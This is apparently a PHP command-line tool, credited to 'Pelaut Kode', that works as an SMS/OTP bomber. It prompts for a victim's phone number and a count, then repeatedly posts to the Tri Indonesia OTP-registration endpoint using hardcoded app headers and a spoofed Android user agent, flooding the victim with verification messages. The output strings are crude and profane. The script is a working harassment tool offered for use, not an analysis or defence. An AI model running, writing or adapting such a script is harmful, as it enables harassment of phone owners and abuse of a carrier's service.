<?php
$green  = "\e[92m";
$red    = "\e[91m";
$yellow = "\e[93m";
$blue   = "\e[36m";
echo "\n$green
                        _    
                     _\( )/_            
Hi! i'm Pelaut Kode   /(O)\  //  \\        
                            _\\()//_    
Trust me, i'm Love You.    / //  \\ \      
                            | \__/ |\n".$red.
"======================================";
echo $blue."
Author  : Pelaut Kode
Github  : http://github.com/Pelautkode
Team    : System Cyber Security
Date    : 06-05-2019\n";
echo $red."=====================================".$green."\n";
sleep(1);
echo "\e[0;1m>>> Nomor Target\n(ex : 6285xxxxxxxxx) : ";
$target = trim(fgets(STDIN));
sleep(2);
echo ">>> jumlah\nMasukan jumlah : ";
$jum = trim(fgets(STDIN));
for ($i=1; $i <= $jum; $i++) {
$header = array("Content-Type: application/json", "operatorId: 50e22f864fc644c081c0e18319187547", "appId: 168e2950623a4dbe8a57beec814ad6b5", "clientVersion: 127");
$post = array("msisdn" => "$target");
$data = json_encode($post);
$g = curl_init();
curl_setopt($g, CURLOPT_URL, "https://registrasi.tri.co.id/ulang/generateOTP");
curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($g, CURLOPT_POST, 1);
curl_setopt($g, CURLOPT_HEADER, 1);
curl_setopt($g, CURLOPT_POSTFIELDS, $data);
curl_setopt($g, CURLOPT_HTTPHEADER, $header);
curl_setopt($g, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 6.0.1; ASUS_X00AD Build/MMB29M)");
$h = curl_exec($g);
curl_close($g);

$json = json_decode($h);
        if($json->code == "200" && $json->status == "success"){
	echo $i. ".Gass Terus Cok !!!\n";
	}else{
		echo $i. ".Gagal bangsat:(\n";
		}
	}

?>
